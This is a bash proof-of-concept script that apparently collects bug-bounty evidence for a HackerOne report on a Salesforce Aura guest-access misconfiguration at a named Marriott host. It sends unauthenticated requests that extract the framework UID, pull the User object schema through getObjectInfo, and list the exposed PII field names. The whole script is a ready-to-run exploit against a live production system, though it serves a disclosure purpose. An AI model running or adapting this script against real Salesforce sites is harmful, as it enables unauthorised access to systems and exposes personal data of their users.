#!/usr/bin/env bash
# M002 Evidence Collection v3 — HackerOne #3817499
# Salesforce Aura Guest User Object Exposure
# 5 sections | 62-col mobile | SHA256 | API field names | field types

export NO_COLOR=1 CLICOLOR=0 BAT_PAGER=cat PAGER=cat BAT_STYLE=plain

TARGET='https://cpp.marriott.com/s/sfsites/aura'
EDIR=~/m002-evidence-$(date -u +%Y%m%d-%H%M%S)
mkdir -p "$EDIR"

LN()  { printf '─%.0s' {1..62}; printf '\n'; }
DLN() { printf '═%.0s' {1..62}; printf '\n'; }
PAUSE() {
  printf '\n'; LN
  printf '  ★  SCREENSHOT %s — take screenshot now\n' "$1"
  LN
  printf '  Press ENTER to continue... '; read -r _; printf '\n'
}

# ── PHASE 1: silent data collection ─────────────────────────
printf 'Collecting evidence (4 requests)...\n'
MYIP=$(curl -s --max-time 10 ifconfig.me)
TS0=$(date -u '+%Y-%m-%d %H:%M:%S UTC')

# 1. Extract fwuid — server leaks it in its own error response
curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message={"actions":[]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"x","app":"siteforce:communityApp","dn":[],"globals":{},"uad":false}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  -o "$EDIR/fwuid-probe.txt" 2>/dev/null

FWUID=$(grep -oP '"fwuid":"[^"]+' "$EDIR/fwuid-probe.txt" \
  | head -1 | cut -d'"' -f4)

if [ -z "$FWUID" ]; then
  printf 'ERROR: fwuid extraction failed\n'; exit 1
fi
printf 'fwuid OK.\n'

# aura.context — built once, reused (double-quoted to expand $FWUID)
ACTX="{\"mode\":\"PROD\",\"fwuid\":\"$FWUID\",\"app\":\"siteforce:communityApp\",\"dn\":[],\"globals\":{},\"uad\":false}"

# 2. Bypass run 1 — verbose for request/response header capture
TS1=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
curl -v -s -X POST "$TARGET" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message={"actions":[{"id":"1","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode "aura.context=$ACTX" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  -o "$EDIR/user-r1-body.txt" 2>"$EDIR/user-r1-verbose.txt"

# 3. Bypass run 2 — reproducibility check
TS2=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message={"actions":[{"id":"1","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode "aura.context=$ACTX" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  -o "$EDIR/user-r2-body.txt" 2>/dev/null

# ── Compute all metrics ──────────────────────────────────────
STATE=$(grep -oP '"state":"[^"]+' "$EDIR/user-r1-body.txt" \
  | head -1 | sed 's/"state":"//')
SIZE1=$(wc -c < "$EDIR/user-r1-body.txt")
SIZE2=$(wc -c < "$EDIR/user-r2-body.txt")
SIZE_MB=$(awk "BEGIN {printf \"%.1f\", $SIZE1/1048576}")

HASH1=$(sha256sum "$EDIR/user-r1-body.txt" 2>/dev/null \
  || shasum -a 256 "$EDIR/user-r1-body.txt")
HASH1=$(echo "$HASH1" | awk '{print $1}')
HASH2=$(sha256sum "$EDIR/user-r2-body.txt" 2>/dev/null \
  || shasum -a 256 "$EDIR/user-r2-body.txt")
HASH2=$(echo "$HASH2" | awk '{print $1}')

# Field API names (deduplicated)
grep -oP '"name":"[A-Za-z][A-Za-z0-9_]+"' "$EDIR/user-r1-body.txt" \
  | sed 's/"name":"//; s/"//' | sort -u \
  > "$EDIR/field-names.txt"
TOTAL_FIELDS=$(wc -l < "$EDIR/field-names.txt")

# Field type breakdown
grep -oP '"dataType":"[^"]+' "$EDIR/user-r1-body.txt" \
  | sed 's/"dataType":"//' | sort | uniq -c | sort -rn \
  > "$EDIR/field-types.txt"

# PII fields — matched by exact Salesforce API name
PII_FIELDS=$(grep -E \
  '^(Email|Phone|MobilePhone|Fax|FirstName|LastName|Name|Username|CompanyName|City|State|StateCode|PostalCode|Country|CountryCode|Street|Alias|CommunityNickname|SmallPhotoUrl|MediumPhotoUrl|FullPhotoUrl|BannerPhotoUrl|AboutMe|Department|Title|Division|IsActive|UserType|ContactId|AccountId)$' \
  "$EDIR/field-names.txt")
PII_COUNT=$(echo "$PII_FIELDS" | grep -c .)

# Truncated response for HackerOne attachment
head -c 50000 "$EDIR/user-r1-body.txt" > "$EDIR/user-response-50k.txt"

printf 'Done. State=%s Fields=%d PII=%d Size=%dB\n\n' \
  "$STATE" "$TOTAL_FIELDS" "$PII_COUNT" "$SIZE1"

# ────────────────────────────────────────────────────────────
# SECTION A — RESEARCHER METADATA
# ────────────────────────────────────────────────────────────
{
DLN
printf '  SECTION A/5 -- RESEARCHER METADATA\n'
DLN
printf '  Date/Time  : %s\n' "$TS0"
printf '  Source IP  : %s\n' "$MYIP"
printf '  Tool       : curl 8.20.0 aarch64-linux-android\n'
printf '  Platform   : aarch64 Linux/Termux (Pi 5)\n'
printf '  Target     : cpp.marriott.com/s/sfsites/aura\n'
printf '  Report     : HackerOne #3817499\n'
DLN
printf '\n  Vulnerability class:\n'
printf '  Salesforce Lightning Community guest profile\n'
printf '  misconfiguration. Unauthenticated caller uses\n'
printf '  aura.token=undefined to access the Aura Wire\n'
printf '  API and retrieve the full User object schema.\n'
printf '\n  aura.token=undefined = guest / no auth\n'
printf '  Expected : "state":"ERROR" + ACCESS_DENIED\n'
printf '  Actual   : "state":"SUCCESS" + %s MB\n' "$SIZE_MB"
DLN
} | tee "$EDIR/section-A.txt"
PAUSE "A/5 (metadata + vulnerability class)"

# ────────────────────────────────────────────────────────────
# SECTION B — FWUID EXTRACTION (proof of open endpoint)
# ────────────────────────────────────────────────────────────
{
DLN
printf '  SECTION B/5 -- FWUID EXTRACTION (unauthenticated)\n'
DLN
printf '\n  Salesforce Aura requires a framework UID (fwuid).\n'
printf '  It is obtained without authentication — the\n'
printf '  server leaks it in its own error response.\n\n'
printf '  >> Probe request:\n'
printf '       POST /s/sfsites/aura\n'
printf '       aura.context.fwuid = "x" (intentionally wrong)\n'
printf '       aura.token = undefined  (no auth)\n\n'
printf '  << Server returns the correct fwuid in error:\n\n'
printf '  %s\n' "${FWUID:0:62}"
[ ${#FWUID} -gt 62 ] && printf '  %s\n' "${FWUID:62}"
printf '\n  No authentication required to extract fwuid.\n'
printf '  This confirms the endpoint is publicly reachable.\n'
DLN
} | tee "$EDIR/section-B.txt"
PAUSE "B/5 (fwuid extraction — no auth)"

# ────────────────────────────────────────────────────────────
# SECTION C — BYPASS REQUEST + RESPONSE
# ────────────────────────────────────────────────────────────
{
DLN
printf '  SECTION C/5 -- BYPASS REQUEST\n'
DLN
printf '\n  Descriptor: aura://RecordUiController\n'
printf '              /ACTION$getObjectInfo\n'
printf '  Object    : User\n'
printf '  Token     : undefined (no auth)\n'
printf '\n  >> Request headers sent:\n'
grep '^> ' "$EDIR/user-r1-verbose.txt" | grep -v '^> $' \
  | sed 's/^> /    /'
printf '\n'
printf '  ┌──────────────────────────────────────────────┐\n'
printf '  │  aura.token=undefined — guest, no auth       │\n'
printf '  │  No Cookie or Authorization header present   │\n'
printf '  └──────────────────────────────────────────────┘\n'
printf '\n  << Response:\n'
grep '^< ' "$EDIR/user-r1-verbose.txt" \
  | sed 's/^< //' \
  | grep -iE '^(HTTP|content-type|server)' \
  | sed 's/^/    /'
printf '    size     : %d bytes (%s MB)\n' "$SIZE1" "$SIZE_MB"
printf '    state    : "%s"\n' "$STATE"
DLN
} | tee "$EDIR/section-C.txt"
PAUSE "C/5 (bypass + state:SUCCESS)"

# ────────────────────────────────────────────────────────────
# SECTION D — EXPOSED FIELD ANALYSIS
# ────────────────────────────────────────────────────────────
{
DLN
printf '  SECTION D/5 -- EXPOSED FIELD ANALYSIS\n'
DLN
printf '\n  Total field definitions in response : %d\n' "$TOTAL_FIELDS"
printf '  Confirmed high-value PII fields     : %d\n' "$PII_COUNT"
printf '\n  Field types exposed:\n'
while IFS= read -r line; do
  printf '    %s\n' "$line"
done < "$EDIR/field-types.txt"
printf '\n  PII field API names confirmed:\n'
echo "$PII_FIELDS" | while IFS= read -r f; do
  [ -n "$f" ] && printf '    %-28s\n' "$f"
done
printf '\n  All %d names saved: field-names.txt\n' "$TOTAL_FIELDS"
DLN
} | tee "$EDIR/section-D.txt"
PAUSE "D/5 (field types + PII API names)"

# ────────────────────────────────────────────────────────────
# SECTION E — REPRODUCIBILITY + VERDICT
# ────────────────────────────────────────────────────────────
{
DLN
printf '  SECTION E/5 -- REPRODUCIBILITY + VERDICT\n'
DLN
printf '\n  Run 1 : %s\n' "$TS1"
printf '  Size  : %d bytes\n' "$SIZE1"
printf '  SHA256: %.32s\n' "$HASH1"
printf '          %.32s\n' "${HASH1:32}"
printf '\n  Run 2 : %s\n' "$TS2"
printf '  Size  : %d bytes\n' "$SIZE2"
printf '  SHA256: %.32s\n' "$HASH2"
printf '          %.32s\n' "${HASH2:32}"
if [ "$HASH1" = "$HASH2" ]; then
  printf '\n  SHA256 MATCH — response is deterministic.\n'
else
  printf '\n  Both runs SUCCESS: %dB + %dB\n' "$SIZE1" "$SIZE2"
fi
printf '\n'
DLN
printf '  *** VERDICT: GUEST USER EXPOSURE CONFIRMED ***\n'
DLN
printf '  Target  : cpp.marriott.com/s/sfsites/aura\n'
printf '  Auth    : aura.token=undefined (none)\n'
printf '  Object  : Salesforce User\n'
printf '  State   : %s\n' "$STATE"
printf '  Size    : %d bytes (%s MB)\n' "$SIZE1" "$SIZE_MB"
printf '  Fields  : %d total, %d PII\n' "$TOTAL_FIELDS" "$PII_COUNT"
printf '  PII     : Email Phone Mobile Name Address\n'
printf '            City Country Photos Alias and more\n'
printf '\n  Tested  : %s\n' "$TS1"
printf '  From IP : %s\n' "$MYIP"
DLN
} | tee "$EDIR/section-E.txt"
PAUSE "E/5 (verdict — final)"

# ── Evidence bundle ──────────────────────────────────────────
{
DLN; printf '  EVIDENCE BUNDLE\n'; DLN
ls -lh "$EDIR/" | awk 'NR>1 {printf "  %s\n", $0}'
DLN
} | tee "$EDIR/evidence-summary.txt"

(cd "$EDIR" && sha256sum \
  user-r1-body.txt user-r1-verbose.txt user-r2-body.txt \
  user-response-50k.txt field-names.txt field-types.txt \
  2>/dev/null || shasum -a 256 \
  user-r1-body.txt user-r1-verbose.txt user-r2-body.txt \
  user-response-50k.txt field-names.txt field-types.txt) \
  > "$EDIR/SHA256SUMS.txt"

B=$(basename "$EDIR")
printf 'SHA256SUMS.txt saved.\n\nRe-display sections:\n'
for S in A B C D E; do
  printf '  command cat ~/%s/section-%s.txt\n' "$B" "$S"
done
